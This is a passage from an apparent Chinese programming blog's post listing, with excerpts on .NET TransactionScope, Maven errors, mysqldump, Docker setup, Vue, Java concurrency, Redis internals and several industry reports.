		TransactionScope的使用 简介1. 命名空间2.创建事务范围3.嵌套事务4.事务提交和回滚5.支持分布式事务6.配置选项7.资源管理器8.分布式事务协调器 应用1.未设置分布式事务2.设置分布式事务 显式事务对象 简介 TransactionScope 是 .NET Framework 和 .NET Core 中的一个类，用于简化事务管理。它提供了一种简单的方式来创建分布式事务和本地事务，以确保一系列操作要么全部成功提交，要么全部回滚，以保持数据的一致性
需要注意的是，TransactionScope 的使用需要系统支持 MSDTC，因此不是所有的环境都适合使用它。在某些情况下，特别是在高性能的场景中，可能需要权衡使用 TransactionScope 的方便性和性能开销。
1. 命名空间 在代码中使用 TransactionScope 时，需要导入以下命名空间：
using System.Transactions;
2.创建事务范围 要使用 TransactionScope，您可以通过创建一个新的 TransactionScope 对象来定义一个事务范围。这个事务范围将包裹一系列数据库或其他资源操作。
using (TransactionScope scope = new TransactionScope()) { // 在这里执行事务性操作 } 3.嵌套事务 您可以在代码中嵌套多个 TransactionScope 对象，形成多层嵌套的事务。在这种情况下，只有最外层的事务范围会影响整个事务。如果内部的事务范围失败，它们会自动回滚，而最外层的事务范围可以选择提交或回滚整个事务
在默认情况下，TransactionScope 中的嵌套事务，如果任何一个子事务发生错误并引发异常，整个事务将会被回滚。这是因为 TransactionScope 使用分布式事务协调器（Distributed Transaction Coordinator，DTC）来进行事务的管理，DTC 通常会对整个事务进行协调和控制。
public async Task Transactions(int id) { try { using (System.Transactions.TransactionScope scope = new System.Transactions.TransactionScope()) { Student item = _studentService.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dd526570f46aefd45521d4c814b9a275/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/515c46506a35bce79c8c6958fad7a31a/" rel="bookmark">
			IDEA项目启动报错：Failed to execute goal on project xxx: Could not resolve dependencies for project
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 报错信息原因分析解决方案Delegate IDE build/run action to Maven使用 Maven 构建项目使用 Maven 运行和调试 报错信息 [ERROR] Failed to execute goal on project xxx: Could not resolve dependencies for project Failed to collect dependencies at xxx .xxx-service:jar:dev: Failed to read artifact descriptor for xxxx/maven-snapshots/ during a previous attempt. This failure was cached in the local repository and resolution is not reattempted until the update interval of nexus-snapshots has elapsed or updates are forced -&gt; [Help 1]
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/515c46506a35bce79c8c6958fad7a31a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30a228ba83d7fe06b349f756e3658ca2/" rel="bookmark">
			通过vue-cropper实现图片预览以及滚轮控制图片大小
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本来是准备自己写的，但是可以更便捷的实现这个效果为什么不用呢
一、第一步肯定是下载依赖
npm install vue-cropper 二、第引入，我是直接在单页面引入的，因为我暂时没有其他地方需要用到
三、使用
&lt;el-dialog class="subcoat" :visible.sync="dialogVisible" width="1000px" append-to-body &gt; &lt;vue-cropper ref="cropper" :img="imageUrl" :info="true" v-if="dialogVisible"/&gt; &lt;/el-dialog&gt; 是不是很简单，实际使用就这几行代码，img绑定一下图片的路径即可，样式看个人喜好
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/241aa1f411701c15fea37add8d84803f/" rel="bookmark">
			MySQL mysqldump数据导出详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MySQL mysqldump数据导出详解 2016-04-07 11:14 pursuer.chen 阅读(357122) 评论(2) 编辑 收藏 举报 介绍 在日常维护工作当中经常会需要对数据进行导出操作，而mysqldump是导出数据过程中使用非常频繁的一个工具；它自带的功能参数非常多，文章中会列举出一些常用的操作，在文章末尾会将所有的参数详细说明列出来。
语法：
默认不带参数的导出，导出文本内容大概如下：创建数据库判断语句-删除表-创建表-锁表-禁用索引-插入数据-启用索引-解锁表。
Usage: mysqldump [OPTIONS] database [tables] OR mysqldump [OPTIONS] --databases [OPTIONS] DB1 [DB2 DB3...] OR mysqldump [OPTIONS] --all-databases [OPTIONS] 插入测试数据
CREATE DATABASE db1 DEFAULT CHARSET utf8; USE db1; CREATE TABLE a1(id int); insert into a1() values(1),(2); CREATE TABLE a2(id int); insert into a2() values(2); CREATE TABLE a3(id int); insert into a3() values(3); CREATE DATABASE db2 DEFAULT CHARSET utf8;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/241aa1f411701c15fea37add8d84803f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2cf716fb7d56fa96fa2a2172dc05e4d3/" rel="bookmark">
			华夏代驾第一天-搭建docker环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		--mysql docker run \ --name mysql5 \ -v /mydata/mysql/data5:/var/lib/mysql \ -v /mydata/mysql/conf5:/etc/mysql/conf.d \ -v /mydata/mysql/log5:/var/log/mysql \ --net mynet --ip 172.18.0.6 \ --restart=always \ --privileged=true \ -p 12005:3306 \ -e MYSQL_ROOT_PASSWORD=123456 \ -e TZ=Asia/Shanghai \ -d mysql:8.0.23 --创建docker网络 docker network create --subnet=172.18.0.0/18 mynet --虚拟机ip地址 192.168.150.128 --minio docker run -p 9000:9000 -p 9090:9090 \ --name minio \ --restart=always \ --net mynet --ip 172.18.0.10 \ -e "MINIO_ACCESS_KEY=minioadmin" \ -e "MINIO_SECRET_KEY=minioadmin" \ -v /mydata/minio/data:/data \ -v /mydata/minio/config:/root/.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2cf716fb7d56fa96fa2a2172dc05e4d3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c5768555da7a283070e786f7f4074b4d/" rel="bookmark">
			【数字图像】实验五.图像的边缘检测和分割（综合性）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、实验目的
1.学会使用编程实现不同算法的边缘检测。
2.学会使用编程实现不同算法的图像分割。 3.能够根据实验结果分析各种算法的特点及其应用场合，培养处理实际图像的能力。
二、实验要求
1.实验课前需要写预习实验报告，内容为本次实验要求中的所有程序清单。
2.实验课对预习报告中的编程代码进行上机调试，完成实验指导书中全部实验要求内容。
3.实验课后写出实验报告。报告要求有实验目的，实验内容与步骤，调试完成的准确编程代码，实验小结，回答问题。
三、实验内容（每一个内容编写一个*.m文件）
1.边缘检测：
（1）利用边缘检测函数edge ()对灰度图像(house.tif)进行边缘检测，检测算子分别选择'roberts'、'sobel'、'prewitt'、LOG、'Canny'（其他参数选择：default），比较不同检测算子对边缘检测的效果；
代码：
clc; %利用边缘检测函数edge ()对灰度图像(house.tif)进行边缘检测，检测算子分别选择'roberts'、'sobel'、'prewitt'、LOG、'Canny'（其他参数选择：default），比较不同检测算子对边缘检测的效果； h=imread("house.tif");%读入图像 hr=edge(h,"roberts");%参数为roberts hs=edge(h,"sobel");%参数为sobel hp=edge(h,"prewitt");%参数为prewitt hl=edge(h,"log");%参数为log hc=edge(h,"canny");%参数为canny figure; subplot(2,3,1),imshow(h); title("原图") subplot(2,3,2),imshow(hr); title("参数为roberts") subplot(2,3,3),imshow(hs); title("参数为sobel") subplot(2,3,4),imshow(hp); title("参数为prewitt") subplot(2,3,5),imshow(hl); title("参数为log") subplot(2,3,6),imshow(hc); title("参数为canny") 结果：
（2）利用工具箱函数imfilter()和如图1所示四种不同方向的线检测模板w1/w2/w3/w4对图像(Fig0908(a).tif)进行边缘检测，比较不同方向的检测算子对边缘检测的效果； -1
-2
-1
-1
0
1
0
1
2
-2
-1
0
0
0
0
-2
0
2
-1
0
1
-1
0
1
1
2
1
-1
0
1
-2
-1
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c5768555da7a283070e786f7f4074b4d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b3b3c8e621f30f727e94f614671aaafd/" rel="bookmark">
			JS鼠标事件onMouseOver和onMouseOut的坑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在React中监听鼠标点击事件，UI如下，左右有padding。
然后鼠标从左往右慢慢滑入HOMR再滑出。
UI代码：
事件绑定在外层父元素上。
事件触发顺序如下。
1 鼠标只碰触父元素padding区域，那么会触发父元素（后面事件都在父元素上）的onMouseEnter和onMouseOver
2 鼠标移动到子元素HOME上面
会执行onMouseOut和再次执行onMouseOver。
3 鼠标移出子元素，移动到父元素右边padding区域
4 鼠标移出父元素
结论：如果执行触发一次应该使用onMouseEnter和onMouseLeave。
一般来说，onMouseOver、onMouseOut一起使用，鼠标经过时自身触发事件，经过其子元素时也触发该事件，每经过一次子元素都触发该事件，属于不断触发；onmouseenter、onmouseleave：鼠标经过时自身或者其子元素都触发事件，但是只触发一次。
如果希望经过子元素和离开子元素改变状态，那么就使用onMouseOver、onMouseOut。
推广一下自己开发的微信小程序，有兴趣的朋友可以玩一玩
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/03ba42a35696becfbd2bf68fbeaa2a69/" rel="bookmark">
			Vue3使用dayjs以及dayjs日期工具类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Vue3使用dayjs全局使用以及将dayjs封装为自己需要的日期工具类 说明安装dayjs命令在main.js里面全局导入在vue模版中使用dayjs语法如下dayjs日期工具类 说明 这里记录下在Vue3里面使用dayjs插件，以及将它在全局使用，并且将dayjs封装成自己需要的日期工具类。留待以后需要时直接使用。
安装dayjs命令 npm install dayjs --save 在main.js里面全局导入 import { createApp } from 'vue' import './style.css' //引入element-plus import ElementPlus from 'element-plus' import 'element-plus/dist/index.css' //引入dayjs日期插件 import dayjs from "dayjs" import App from './App.vue' const app = createApp(App) //使用element-plus app.use(ElementPlus) //全局使用dayjs app.config.globalProperties.$dayjs=dayjs app.mount('#app') 在vue模版中使用dayjs语法如下 //使用dayjs将当前时间转换为指定样式 this.$dayjs(new Date()).format("YYYY-MM-DD HH:mm:ss") 浏览器结果如下:
dayjs日期工具类 在dateUtil.js里面局部使用dayjs，并将它封装为自己的日期工具类。
//日期工具类 //局部导入dayjs import dayjs from 'dayjs' /** * 校检日期格式是否为YYYY-MM-DD这种格式 * @param date * @returns {boolean} */ export function isValidDate(date) { return dayjs(date,"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/03ba42a35696becfbd2bf68fbeaa2a69/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/86d33d35db35ef10974cbda09b69bbd7/" rel="bookmark">
			数据要素专题报告：数字广告数据要素流通保障技术研究报告
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天分享的数据要素系列深度研究报告：《数据要素专题报告：数字广告数据要素流通保障技术研究报告》。
（报告出品方：中国信息通信研究院泰尔终端实验室）
报告共计：52页
数字广告数据要素流通概述 数据的价值在于充分的流通使用。作为新型生产要素，数据要素 具有独特的技术、经济特征，可重新编程性和场景依赖性、用户体验 性、广泛赋能性等特征使得数字环境下的数据要素流通能够突破传统 时空限制、组织边界束缚与行业壁垒，以多源多模态实时数据的无障 碍流通与价值增值为核心，深刻改变人们的学习工作和生活方式，并 为数字产业化和产业数字化的加速发展奠定基础。当前，数据已被视 为构建现代化产业体系的重要组成部分，有序衔接、高效畅通的数据使用是优化产业结构、发展新质生产力不可或缺的基础要件。麦肯锡全球研究所称，数据流动带来价值已超过全球货物贸易的价值。
发展数字广告是世界性趋势，2021 年，国家统计局在印发的《数 字经济及其核心产业统计分类》中，将数字广告列为数字经济及其核 心产业的统计范畴，标志着数字广告的产业发展已跨越传统广告业而 进入到新的发展阶段。作为全球第二大广告市场，中国数字广告产业 市场规模达到万亿元以上，对于促进消费、扩大就业、开发创意空间、 激发市场活力从而拉动经济高质量增长具有重要的牵引推动作用。
数字广告数据要素流通现状和挑战 数据泄露引发担忧，流通意愿待加强
数据泄露问题已成为全球性难题。据国际数据公司(IDC)预测2025 年全球数据量将高达 175ZB，其中，中国数据总量增速最为迅猛，正以高于全球平均年增长速度 3%的幅度激增，预计 2025 年增至48.6ZB，占全球数据圈的 27.8%，成为全球最大的数据圈。
随之而来的是数据泄露、数据滥用等数据安全事件频发。据《中国政企机构数据安全风险分析报告》个绍，2022 年 1 月至 10 月全球政企机构重大数据安全报道 180 起，其中数据泄露相关安全事件 93 起，比如国内某快递公司 10 亿用户信息发生泄露。
国际上也发生多起严重的信息泄露事件，比如 2018 年 3 月曝光 的剑桥分析事件中，Facebook 泄露 8700 万用户数据，影响美国大选； Uber 泄露全球 3500 万用户、370 万名司机的个人信息。数据一旦被 获取后，用户便失去了对数据的控制权，若个人数据被不法分子获取， 很容易对用户的财产、名誉等造成损失，有甚者更是会对国家安全、 公众利益和组织利益带来重大损害。
数据“孤岛”向“平台”演进，平台互通待加快
数据孤岛指的是数据在不同部门间独立存储和维护，受制于技术阻碍、企业/行业保护机制以及政策法规等因素而形成的不对称、冗余等封闭或半封闭式现象，普遍存在于所有需要进行数据共享和交换的系统之间，涉及不同部门、企业、产业间数据信息能否共享等问题。
近年来，互联网平台方为加强数据安全和保护用户隐私，纷纷推出广告数据平台。一些大型企业更是建立了具有独立存储空间和严格权限管理机制、能为重要数据加密且保证数据不出库等特点的Ads Data Hub; 广告主和中小媒体可依附于上述数据平台进行数据融合流通。数据平台的建立，可保证域内数据安全流通，实现数据可用不可见，有效保障用户隐私，一定程度上缓解了“数据孤岛”现象。
广告标识符策略收紧，演进方案待升级
日益收紧的隐私保护法案及针对互联网巨头的反断调查都让广告界通用的基于标识符的用户追踪方式愈加受到挑战。从全球来看通过唯一标识符开展数字广告业务的趋势也在逐渐收紧，国际上诸如iOS、Android 等主流操作系统平台基于隐私保护方面的合法合规考虑，都在逐渐弱化或取消直接通过唯一标识符来开展广告业务。
2021 年 4 月，随着苹果 ioS 14.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/86d33d35db35ef10974cbda09b69bbd7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/281a1d7159122ec8dafd70d821e51f85/" rel="bookmark">
			华为人工智能行业报告：矿山智能化暨矿山大模型最佳实践白皮书
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天分享的人工智能系列深度研究报告：《华为人工智能行业报告：矿山智能化暨矿山大模型最佳实践白皮书》。
（报告出品方：山东能源集团）
报告共计：35页
大模型引领人工智能发展方向 近年来，人工智能技术发展迅猛，大模型在人工智能发展方向上发挥了重要的引领作用。大模型以其巨大的模型参数规模、大数据预训练和对强大计算能力的需求而著称。通过对大量数据集的预学习，大模型展现出卓越的模型精度和泛化能力，为众多领域提供了革命性的解决方案。
以自然语言大模型为例，大模型在处理自然语言任务时表现出了惊人的能力。当模型参数规模达到600多亿时，大模型在翻译和数学能力方面表现出色。当模型参数增加到1300亿时，大模型具备了上下文学习和处理复杂任务的能力。而当模型参数增加到5300亿时，大模型展示出知识组合和情感感知的能力。
大模型的智能化表现不仅仅局限于特定的任务它还实现了从感知理解到生成创造、从专用到通用的全面智能化探索，为我们带来了无尽的创新空间，引领了一场方兴未艾的科技革命和产业变革。
大模型深入行业，引发范式变革 国内外多款生成式自然语言大模型的火热出圈让大众对大模型能进行对话、写诗、作画等任务不再陌生，但这只是大模型应用的冰山一角。大模型只有深入到工业制造、金融科技、生物医药科学研究等众多行业领域开展应用，才能真正发挥其巨大潜力。面对行业垂直领域的复杂任务，单一形态的大模型显然难以胜任，这就需要多种形态的大模型，来应对行业不同场景。
矿山企业确立智能化发展战略 以山东能源为例，作为山东省煤炭行业的龙头企 业，自2020年9月全国煤矿智能化建设现场会召 开以来，为落实“深化机械化换人、自动化减 人，建设一批智能化示范煤矿”要求，树牢“少 人则安、高效可靠、实用实效”理念，构建了三 项机制，即规划标准引领机制、科学分类建设机 制、定期考核评价机制；筑牢了四大支撑，即建 好平台支撑、强化技术支撑、筑牢装备支撑、夯 实人才支撑；坚持了五个着力，即着力打造示范 矿井、着力推进少人无人、着力提升生产效率、 着力强化信息建设、着力保障生命安全健康，通过以上举措，持续推动智能化建设提档升级。
矿山智能化现状挑战 煤炭行业推进智能化建设，依赖人工智能技术的 支持，但传统单场景小模型方案存在诸多问题， 制约了矿山智能化、规模化建设的发展。
模型可移植性差。传统模式针对一个矿山开发的模型无法直接复用到其它矿山，在一个生产单位训练的模型，转至其它单位应用时准确度明显下降，模型泛化性不足，难以规模化复制。
工况变化，精度满足度低。人工智能模型需要响应行业应用的快速变化，工况发生变化时模型的精度、性能、可扩展性等指标无法满足实际生产需求。
数据安全风险。传统模式的算法训练需要将煤矿的数据导出到线下开发环境进行训练，过程中数据安全保障困难，存在数据泄露等安全风险。
矿山大模型基于"1+4+N" 架构 推动矿山智能化升级 针对单场景小模型方案的问题，华为推出矿山大模型解决方案，采用“1+4+N”总体架构，以 分层解耦架构为特点，结合数据安全和隐私保护 技术，利用无监督或自监督学习方法，从行业数 据中提取知识，以满足煤炭行业不同业务场景的 智能化需求。
“1”是矿山一站式AI平台: 华为云面向煤炭行业的智能化推出一站式AI平台，提供全流程的大模型训练与推理服务，具备训练算法管理、作业管理、多开发框架支持、模型统一管理、服务按需部署能力，支持GPU、CPU资源调度与统一管理，帮助用户管理全周期AI工作流，助力应用开发者快速完成模型开发与上线，使能煤炭行业创新AI业务。
“4”是矿山大模型的核心能力: LO层大模型由华为已投入大量算力、人力等资源，并基于海量数据预训练而来，包含视觉、预测、自然语言处理、多模态四大基础通用能力，参数已发展到千亿级别，泛化能力强，作为矿山大模型预训练的模型底座，华为拥有完全的知识产权。以L0层大模型为基础，华为面向煤炭行业开展深度合作，把煤炭行业的海量知识，如数百万张矿山图片，结合矿山通用场景，预训练出L1层矿山大模型，包括物体检测、语义分割等开发套件。这些开发套件可以对外授权，开放使用。L1层是煤炭行业的通用模型，能够与矿山具体业务场景结合，训练出L2层场景化模型。
“N”是一系列应用于矿山具体业务场景的专属模型:通过遵选、调研矿山业务领域，选择合适类型的L1场景化工作流(以下简称工作流)。在获得授权情况下，可以选择合适的L1层开发套件(以下简称开发套件)，否则工作流只能调用预制的开发套件。工作流定义了训练L2层场景化模型的整体流程，实现L2层场景化模型可视化、向导式的训练。L2层场景化模型的生产层面，会根据用户的模型大小需求，从预训练模型中抽取满足需求的模型结构和权重。然后根据数据特点，在抽取后的模型上进行算法调优，生产可分发部署的推理模型。
矿山大模型的优势在于它不仅能有效提升样本训练效率、降低样本标注的人力成本，还能与矿山业务应用深度融合，通过小样本快速训练出需要的场景化模型。同时，矿山大模型具有高泛化性和移植性，能适应矿山的不同业务场景。此外，矿山大模型实现了全栈自主创新，为煤炭行业智能化建设提供了综合解决方案。
关键实践措施阐述 大型矿业集团在建设矿山大模型的过程中面临诸 多挑战。由于下属矿山企业信息化程度不同、基础建设各异、技术团队能力参差不齐、对大模型 的认识尚且不足，且矿山大模型作为新生事物， 缺少行业内的标杆参照，这些因素都增加了建设 过程的难度。
1. 做好顶层设计，集团中心统建，矿山边缘应用
通过在（山东能源）集团层面集约化建设统一的 矿山大模型，可以统一思想，通过顶层设计明确 项目建设的权责，从全局视角拉通业务与技术， 明确目标与措施，协同内部资源，实现多元知识 的融合，构筑共享的AI能力，支持集团决策和运 营，促进集团业务转型和创新发展。
2. 结合场景技术选型，采用试点先行策略逐步
建设 矿山大模型的建设，需要深入了解业务需求和应 用场景，分析业务数据特点，规划选用的基模型，适配开发套件，制定可行的技术方案。如防冲卸压场景，通过现场摄像头采集的视频数据开展业务，符合CV大模型能力范畴，经实验证 明，钻杆识别准确率高于钻孔识别，适用事件检 测开发套件，以此为基础进一步开展场景化模型的训练工作。
3. 实施标准化的工作流程，有序推进业务场景智能化建设
制定标准化工作流程，涵盖需求分析、设计、开发、测试和试运行等各环节，不仅有利于提高场 景智能化建设的效率，也有利于（山东能源）集团评估建设所需资源，厘清工作界面，提前开展 资源筹备，合理规划进度，从而保障目标达成。
4. 智能矿山工业互联网“三个统一”架构是确保大模型建设取得实效的关键保障
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/281a1d7159122ec8dafd70d821e51f85/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/24ba420a8ed1d0b480115341189be521/" rel="bookmark">
			新材料行业深度研究：AI算力以及5.5G演进，带动高频高速材料发展
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天分享的新材料行业系列深度研究报告：《新材料行业深度研究：AI算力以及5.5G演进，带动高频高速材料发展》。
（报告出品方：国金证券）
报告共计：21页
一、AI 服务器发展将带动覆铜板材料环节的创新 1.1 AI 服务器发展和普通服务器升级带动 M6+以上覆铜板使用
高速数据传输对覆铜板材料的电性能提出了新的要求。覆钢板材料本身在电场作用下存在一定的能量耗散，会造成信息传输过程中的信号损失，不利于信息的高速传输。其中最为关心的是电性能中的 Dk 与 Df (介电常数和介质损耗因子)，尤其 Df 指标。
松下电工 Megtron 系列为高速覆铜板领域分级标杆，历年发布的不同等级高速覆铜板依 次为 Megtron2、Megtron4、Megtron6、Megtron8 等（简称为 M2、M4、M6、M8）。覆铜板业内其他厂商会发布基本技术等级处于同一水平的对标产品，逐渐形成了覆铜板 M2-M4- M6-M8 的演化路径。
AI 服务器我们瞄准英伟达 DGX A100 和 DGX H100 两款具有标杆性产品力的产品进行分析，我们首先从 DGX A100 出发来观测具有产品力的 AI 服务器的基本架构。
从功能性的角度，我们认为 AI 服务器的 PCB 价值量计算可以归纳为三个部分，其一是AI 服务器最为核心的 GPU 板组，其二是所有服务器都必备的 CPU 母板组，最后是风扇硬盘、电源板块等配件组。GPU 板组的 PCB主要是由4个部分组成，GPU 载板、NVSwitch,OAM、UBB。目前英伟达服务器的 UBB 部分主要用台光 890K 覆铜板，而 OAM 部分用台光528K(对应松下 M6+) 覆铜板。树脂方面，PPO 可以满足更低的 Df 需求,双马 BMI 提供压合以及辅料等需求，根据台光电子官网以及产业链调研，台光电子 528K 覆钢板主体树脂以双马 BMI 树脂为主，而 890K (对应松下 M7+) 覆铜板主体树脂以 PPO 为主，双马 BMI树脂为辅。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/24ba420a8ed1d0b480115341189be521/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/50238278eb3723f3fcf1e752ff8a56f0/" rel="bookmark">
			如何高逼格的写java代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		记录一些了解的高逼格、好用的java代码 欢迎大家补充，共同学习
1. 函数式接口—@FunctionalInterface 好处：高逼格、代码收拢、解藕、统一处理
适用范围：具有共性的接口调用代码
举个栗子：
在我们平时的微服务开发中，调用其他服务的接口，通常要把接口调用部分做异常处理(try catch)，或者打印异常日志或者结果日志，并且也有可能做一些统一的调用处理，比如微服务接口熔断等处理，这个时候可以适用函数式接口收拢所有的微服务调用集中处理
这是一个微服务接口
public interface TestServer { T test(); void test2(); } 普通的方式调用上面的微服务方法
public class RpcTestServerImpl{ //引用微服务接口 private TestServer testServer;	public T test(){ try{ return testServer.test(); }catch (Exception e){ log.error("RPC error: ", e); } return null; } public void test2(){ try{ testServer.test2(); }catch (Exception e){ log.error("RPC error: ", e); } } } 使用函数式接口后的写法：先定义统一调用类
//首先定义一个ServerExecutor public class ServerExecutor { //不需要返回值的 public static void execute(Runnable runnable) { try { //调用前和调用后可以做一些处理，比如熔断、日志等等 runnable.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/50238278eb3723f3fcf1e752ff8a56f0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce4db05aef21ccb58699bcb86d6f33a6/" rel="bookmark">
			实现CompletableFuture的返回数据，放入每个list中
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为啥使用CompletableFuture 有时候我们后端接口，可能会有多个查询，而且这些查询是互不关联的，使用串行的方式，在数据量不大的时候，时间没什么影响，但是在数据量大的时候，使用CompletableFuture也是一种提高效率的方法
//获取存款 CompletableFuture&lt;List&lt;Map&lt;String, Object&gt;&gt;&gt; balanceFuture = CompletableFuture.supplyAsync(() -&gt; { List&lt;Map&lt;String, Object&gt;&gt; mapList = businessMapper.getDepositsByName(param1); return mapList; }); //获取贷款 CompletableFuture&lt;List&lt;Map&lt;String, Object&gt;&gt;&gt; tableInFuture = CompletableFuture.supplyAsync(() -&gt; { List&lt;Map&lt;String, Object&gt;&gt; mapListB = businessMapper.getDepositsByName(param2); return mapListB; }); //等balanceFuture tableInFuture 两个任务都执行完 CompletableFuture.allOf(balanceFuture,tableInFuture); List&lt;Map&lt;String, Object&gt;&gt; mapList = balanceFuture.join(); List&lt;Map&lt;String, Object&gt;&gt; mapListB = tableInFuture.join(); 如上，使用CompletableFuture查询存款和贷款的，使用了异步，所以两个sql的时间不会累加。
下面还有一种是使用在for循环中，当然一般是不能把查询放入for循环中的，但是如果实在需要，也是可以用CompletableFuture的
List&lt;Map&lt;String,Object&gt;&gt; list = userMapper.groupMonthCount(year); List&lt;CompletableFuture&lt;List&lt;Map&lt;String, Object&gt;&gt;&gt;&gt; futures = new ArrayList&lt;&gt;(); for (Map&lt;String, Object&gt; map : list) { Object month = map.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ce4db05aef21ccb58699bcb86d6f33a6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1c7f27824023e9f3a6180f1fda1f39ec/" rel="bookmark">
			GoLang EASY 游戏框架 之 应用项目&#43;教程 02
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 Program Examples Overview 用easy 实现的 服务端 和客户端样例。
simple 项目构建了比较完备的目录结构，可以作为空项目拿到项目中直接应用。
传送门：https://github.com/slclub/easy
位置：
examples/simple examples/simple_client 2 Simple 比较简单的源码样例；
这是一个简单的服务端，你可以直接拿它做项目，扩展开发即可。
最基本的easy框架使用简单的游戏架构，不包含数据层；simple代码以极简化为主，项目扩展要 结构化一些目录多是空的 2.1 simple.Server 项目名：simple
目录结构：
-conf // 配置 --controller 控制器也就是解读消息的入口 --callback 放置一些基本的回调函数，如链接创建，服务平滑关闭等 --login 登陆模块 --player 用户玩家 --store 商铺 --world 大世界相关 --initialize 初始化，工程启动执行一次；与运行时无关 --lservers 接入easy监听服务 l 是 ```listen``` 当让也可以接入其他的监听服务 --message 消息定义 --models 数据模型，尽量只有数据结构的定义，和基本验证 --services 游戏逻辑存放区域，主要的逻辑都可以放在这里 --vendors 您项目的一些必要基础功能性的包，或者接入第三方包（且这个包需要配置等）；// 并非是替代 go mod 注意： go mod 中也有一个verdor 且会产生vendor文件夹 我们这里的vendors 仅仅是common 通用，基础，标准等的意思 这里的包之间互相依赖也少，或者说机会是无 比较大（功能性）的包引入后，总需要配置一些东西，甚至和自己的配置参数相关，那么放在这里改造一下（符合工程写法，结构要求等）就比较合适了 运行命令：go build &amp;&amp; .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1c7f27824023e9f3a6180f1fda1f39ec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/691e1cbf3fe91ae4bd212597b7f4088b/" rel="bookmark">
			【Redis】深入理解 Redis 常用数据类型源码及底层实现（1.结构与源码概述）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在文章【Redis】不卡壳的 Redis 学习之路：从十大数据类型开始入手中我们介绍了Redis常用的10大数据类型，这10大数据类型可并不是直接在底层通过代码实现的，而是通过不同的底层数据结构组合起来的，这篇我们介绍下Redis常用数据类型的底层数据结构(￣∇￣)/
Redis数据类型的底层数据结构 SDS动态字符串双向链表压缩列表ziplist哈希表hashtable跳表skiplist整数集合intset快速列表quicklist紧凑列表listpack 在哪里看Redis源码 网站地址
github.com/redis/redis
Redis根目录下src文件夹📁
Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存、分布式、可选持久性的键值对（Key-Value）存储数据库，并提供多种语言的API。
参考书籍推荐
源码概况 Github官网
github.com/redis/redis
Redis基本的数据结构（骨架） 从官网可以看到对于部分关键的.c文件的介绍，最重要的两个：dict.c 、object.c
Redis数据库的实现 数据库的底层实现db.c持久化rdb.c和aof.c Redis服务端和客户端实现 事件驱动ae.c和ae_epoll.c网络连接anet.c和networking.c服务端程序server.c客户端程序redis-cli.c 其他 主从复制replication.c哨兵sentinel.c集群cluster.c其他数据结构，如hyperloglog.c、geo.c等其他功能，如pub/sub、Lua脚本 详解字典数据库K-V键值对 键值对是怎样实现的 Redis是key-value存储系统
key一般都是string类型的字符串对象
value则为Redis对象（redisObject）
